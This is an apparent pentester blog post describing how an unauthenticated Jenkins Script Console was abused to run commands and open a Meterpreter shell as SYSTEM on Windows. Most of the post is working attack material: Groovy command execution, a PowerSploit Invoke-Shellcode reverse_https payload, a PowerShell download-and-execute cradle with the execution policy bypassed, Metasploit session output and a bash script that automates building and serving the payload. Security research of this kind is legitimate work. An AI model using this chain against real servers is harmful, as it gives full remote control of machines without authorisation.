<!doctype html><html lang=en>
<head>
<title>
jenkins to meterpreter toying with powersploit ::
#!/bin/note
— a checkbox uncheckers notepad
</title>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=description content=" Recently I came across a few Jenkins continuous integration servers. A relatively old version I might add but that fact was not important. What was important though was the fact that it was not configured to be &amp;lsquo;secure&amp;rsquo;. Right out of the box Jenkins does not require any authentication to make use of it. In fact, it seems like its almost plug and play.
">
<meta name=keywords content="blog,hack,ctf,leonjza,pentester,red team,attack">
<meta name=robots content="noodp">
<link rel=canonical href=https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter-toying-with-powersploit/>
<link rel=stylesheet href=https://leonjza.github.io/assets/style.css>
<link rel=stylesheet href=https://leonjza.github.io/style.css>
<link rel=apple-touch-icon-precomposed sizes=144x144 href=https://leonjza.github.io/img/apple-touch-icon-144-precomposed.png>
<link rel="shortcut icon" href=https://leonjza.github.io/img/favicon.png>
<link href=https://leonjza.github.io/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=https://leonjza.github.io/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=https://leonjza.github.io/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=https://leonjza.github.io/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=https://leonjza.github.io/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=https://leonjza.github.io/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<meta name=twitter:card content="summary">
<meta name=twitter:title content="jenkins to meterpreter toying with powersploit">
<meta name=twitter:description content="
    
    
  


Recently I came across a few Jenkins continuous integration servers. A relatively old version I might add but that fact was not important. What was important though was the fact that it was not configured to be &lsquo;secure&rsquo;. Right out of the box Jenkins does not require any authentication to make use of it. In fact, it seems like its almost plug and play.">
<meta property="og:title" content="jenkins to meterpreter toying with powersploit">
<meta property="og:description" content="
    
    
  


Recently I came across a few Jenkins continuous integration servers. A relatively old version I might add but that fact was not important. What was important though was the fact that it was not configured to be &lsquo;secure&rsquo;. Right out of the box Jenkins does not require any authentication to make use of it. In fact, it seems like its almost plug and play.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter-toying-with-powersploit/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2015-05-27T20:40:40+00:00">
<meta property="article:modified_time" content="2015-05-27T20:40:40+00:00"><meta property="og:site_name" content="#!/bin/note
">
</head>
<body class=dark-theme>
<div class=container>
<header class=header>
<span class=header__inner>
<a href=/ class=logo style=text-decoration:none>
<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
</span>
<span class=logo__text>#!/bin/note
</span>
<span class=logo__cursor></span>
</a>
<span class=header__right>
<nav class=menu>
<ul class="menu__inner menu__inner--desktop">
<li><a href=/about/>About Me</a></li>
<li><a href=/categories>Categories</a></li>
<li><a href=/posts>Posts</a></li>
</ul>
<ul class="menu__inner menu__inner--mobile">
<li><a href=/about/>About Me</a></li>
<li><a href=/categories>Categories</a></li>
<li><a href=/posts>Posts</a></li>
</ul>
</nav>
<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
</span>
<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
</span>
</span>
</span>
</header>
<div class=content>
<div class=post>
<h1 class=post-title>jenkins to meterpreter toying with powersploit</h1>
<div class=post-meta>
<span class=post-date>
2015-05-27
</span>
<span class=post-read-time>— 5 min read</span>
</div>
<div class=post-content>
<h2>Table of Contents</h2>
<aside class=table-of-contents><nav id=TableOfContents>
<ul>
<li>
<ul>
<li><a href=#groooooooovy>groooooooovy</a></li>
<li><a href=#interactive-shell-power-shell>interactive shell, power shell</a></li>
<li><a href=#preparing-the-payload>preparing the payload</a></li>
<li><a href=#preparing-the-command>preparing the command</a></li>
<li><a href=#pwn>pwn</a></li>
<li><a href=#automation>automation</a></li>
</ul>
</li>
</ul>
</nav></aside>
<figure class=left>
<img src=/images/jenkins_logo.png>
</figure>
<p>Recently I came across a few <a href=https://jenkins-ci.org/>Jenkins</a> continuous integration servers. A relatively old version I might add but that fact was not important. What was important though was the fact that it was not configured to be <em>&lsquo;secure&rsquo;</em>. Right out of the box Jenkins does not require any authentication to make use of it. In fact, it seems like its almost plug and play.</p>
<h2 id=groooooooovy>groooooooovy</h2>
<p>At first glance I was not too sure about what opportunities I was presented with when finding this. Poking around through the web interface eventually got me to the <em>Script Console</em> that Jenkins provides:</p>
<figure class=left>
<img src=/images/jenkins_script_console.png>
</figure>
<p>This looked promising. <em>&lsquo;Type in an arbitrary Groovy script and execute it on the server.'</em> I had zero idea what Groovy Script was so to the le-Googles it was. Some research revealed that it is actually possible to execute commands using it. In fact, the syntax was quite expressive as explained in the <a href=http://www.groovy-lang.org/groovy-dev-kit.html#process-management>documentation</a>.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>def process = &#34;ls -l&#34;.execute()
println &#34;Found text ${process.text}&#34;
</code></pre></div><p>The documentation goes into enough detail explaining the different options you have to execute commands, but the above snippet was enough to get going. To help with testing, I setup a local instance of the latest Jenkins (v1.615) and ran the Groovy Script. Remember, I was able to do this without any authentication requirement!</p>
<figure class=left>
<img src=/images/jenkins_console_command_exec.png>
</figure>
<p>Nice and easy command execution! :D</p>
<h2 id=interactive-shell-power-shell>interactive shell, power shell</h2>
<p>Getting an interactive shell on linux based hosts was as simple as picking your favorite flavor of <a href=http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>reverse shell</a> and moving on from there. On Windows based environments though, the builtin <code>cmd.exe</code> definitely has its limitations. For this reason, reaching out for a meterpreter shell is almost a knee-jerk reaction.</p>
<p>The one Jenkins machine that I had found was running on Windows as <code>nt authority\system</code>, which of course was <em>great</em> news! I figured though that in order to get a meterpreter shell, I&rsquo;d have to approach this in some conventional way. Either obtaining credentials somehow and launching it with say the metasploit SMB PSExec, or uploading an .exe somehow and executing that. Some investigations showed though that the AV on the box was killing the meterpreter.exe on the box so that option was out as well. So, next on the list? I could just make use of <code>Invoke-Shellcode.ps1</code> from <a href=https://github.com/mattifestation/PowerSploit>PowerSploit</a> to download and execute one using one command.</p>
<p>Admittedly, I have never actually done this so a little Google-fu and research was needed to get it working right, but eventually this payed off.</p>
<p>In essence, getting the meterpreter shell up required 2 things (apart from the command execution). A <code>payload</code> which includes the <code>Invoke-Shellcode.ps1</code> powershell script together with the meterpreter connection details, and an encoded powershell command to be executed using the command execution we have. Together these will download the hosted payload and prepare the meterpreter. If this sounds a little confusing, don&rsquo;t worry it should be more clear after we have gone through it.</p>
<h2 id=preparing-the-payload>preparing the payload</h2>
<p>As already mentioned, I was going to use <code>Invoke-Shellcode.ps1</code> from <a href=https://github.com/mattifestation/PowerSploit>PowerSploit</a>. This will go into the payload that needs to be downloaded to bring the meterpreter up. When talking about <em>payload</em> here, all it really is is a file that will be made available via HTTP for the powershell script to download.</p>
<p>The payload will consist of 2 parts. First, defining <code>function Invoke-Shellcode {}</code>, and then invoking the function for a <code>windows/meterpreter/reverse_https</code> shell. Kali Linux has powersploit available in <code>/usr/share</code> so all I really did was cat it to my <code>payload</code> file:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ cat /usr/share/powersploit/CodeExecution/Invoke-Shellcode.ps1 &gt; payload
</code></pre></div><p>After that, I added the following line to the <code>payload</code> file which will invoke the introduced function and connect the meterpreter. My listener was on 192.168.252.1 on port 443:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.252.1 -Lport <span style=color:#ae81ff>443</span> -Force
</code></pre></div><p>This file was finally served via HTTP using the python SimpleHTTPServer with <code>python -m SimpleHTTPServer</code> which meant that it would be available at http://192.168.252.1:8000/payload.</p>
<h2 id=preparing-the-command>preparing the command</h2>
<p>Next, we need to prepare the actual command to run. We will make use of the powershell <a href=https://technet.microsoft.com/en-us/library/hh849893.aspx>Invoke-Expression</a> command and give it a [Net.WebClient.DownloadString](<a href="https://msdn.microsoft.com/en-us/library/ms144200(v=vs.110.aspx)">https://msdn.microsoft.com/en-us/library/ms144200(v=vs.110.aspx)</a> object to download the payload we previously prepared and execute it.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>iex (New-Object Net.WebClient).DownloadString(<span style=color:#e6db74>&#39;http://192.168.252.1:8000/payload&#39;</span>)
</code></pre></div><p>That whole command needs to be <a href=http://blogs.msdn.com/b/timid/archive/2014/03/26/powershell-encodedcommand-and-round-trips.aspx>encoded</a> so that, using the command injection, we can run powershell and not worry about escaping and things like that. I found some snippets online to help with this.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>echo $scriptblock | iconv --to-code UTF-16LE | base64 -w <span style=color:#ae81ff>0</span>
</code></pre></div><p>The above will output a base64 encoded string that should be passed to the Powershell <code>-Enc</code> flag for execution. The last hurdle to overcome was a potential execution policy. The tl;dr of this is that it can be bypassed by simply passing <code>-Exec ByPass</code> to the powershell executable. So, in summary, the command will be as follows:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc aQBlAHgAIAAoAE4 <span style=color:#66d9ef>[snip]</span> BjBkACcAKQAKAA==
</code></pre></div><h2 id=pwn>pwn</h2>
<p>So, I now had the <code>payload</code> file available for download via HTTP, and the command I needed to run. The last thing I had to do was setup a reverse_https listener in metasploit and run the command!</p>
<figure class=left>
<img src=/images/jenkins_powershell_payload.png>
</figure>
<p>From the python web server we can see the request come in for the payload:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>192.168.252.100 - - [28/May/2015 12:37:15] &#34;GET /payload HTTP/1.1&#34; 200 -
</code></pre></div><p>And pop!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>msf exploit<span style=color:#f92672>(</span>handler<span style=color:#f92672>)</span> &gt; exploit

<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Started HTTPS reverse handler on https://0.0.0.0:443/
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Starting the payload handler...
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 192.168.252.100:54023 Request received <span style=color:#66d9ef>for</span> /INITM...
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 192.168.252.100:54023 Staging connection <span style=color:#66d9ef>for</span> target /INITM received...
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Meterpreter session <span style=color:#ae81ff>1</span> opened <span style=color:#f92672>(</span>192.168.252.1:443 -&gt; 192.168.252.100:54023<span style=color:#f92672>)</span> at 2015-05-28 12:37:17 +0200

meterpreter &gt;
meterpreter &gt; getuid
Server username: NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM
</code></pre></div><h2 id=automation>automation</h2>
<p>While testing this, I slapped together a small script that will prepare the command to run and start the SimpleHTTPServer:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e>#!/bin/bash
</span><span style=color:#75715e></span>
<span style=color:#75715e># meterpreter ip &amp; port</span>
lhost<span style=color:#f92672>=</span>192.168.252.1
lport<span style=color:#f92672>=</span><span style=color:#ae81ff>443</span>

echo <span style=color:#e6db74>&#34; * Writing Payload&#34;</span>
cat /usr/share/powersploit/CodeExecution/Invoke-Shellcode.ps1 &gt; payload
echo <span style=color:#e6db74>&#34;Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost </span>$lhost<span style=color:#e6db74> -Lport </span>$lport<span style=color:#e6db74> -Force&#34;</span> &gt;&gt; payload

echo <span style=color:#e6db74>&#34; * Prepping Command&#34;</span>
scriptblock<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;iex (New-Object Net.WebClient).DownloadString(&#39;http://</span>$lhost<span style=color:#e6db74>:8000/payload&#39;)&#34;</span>
echo $scriptblock

echo
echo <span style=color:#e6db74>&#34; * Encoding command&#34;</span>
encode<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;`echo </span>$scriptblock<span style=color:#e6db74> | iconv --to-code UTF-16LE | base64 -w 0`&#34;</span>
echo $encode

command<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc </span>$encode<span style=color:#e6db74>&#34;</span>
echo
echo <span style=color:#e6db74>&#34; * Final command&#34;</span>
echo $command

echo
echo <span style=color:#e6db74>&#34; * Starting HTTP Server to serve payload&#34;</span>
python -m SimpleHTTPServer
</code></pre></div>
</div>
<div class=pagination>
<div class=pagination__title>
<span class=pagination__title-h>Read other posts</span>
<hr>
</div>
<div class=pagination__buttons>
<span class="button previous">
<a href=https://leonjza.github.io/blog/2015/08/21/flick-ii-vuln-vm-with-a-mobile-twist/>
<span class=button__icon>←</span>
<span class=button__text>flick II vuln vm with a mobile twist</span>
</a>
</span>
<span class="button next">
<a href=https://leonjza.github.io/blog/2015/05/08/playing-exploit-exercises-nebula/>
<span class=button__text>playing exploit-exercises - nebula</span>
<span class=button__icon>→</span>
</a>
</span>
</div>
</div>
</div>
</div>
<footer class=footer>
<div class=footer__inner>
<div class="copyright copyright--user"><a href=https://twitter.com/leonjza>@leonjza</a></div>
</div>
</footer>
<script src=https://leonjza.github.io/assets/main.js></script>
<script src=https://leonjza.github.io/assets/prism.js></script>
</div>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script>
</body>
</html>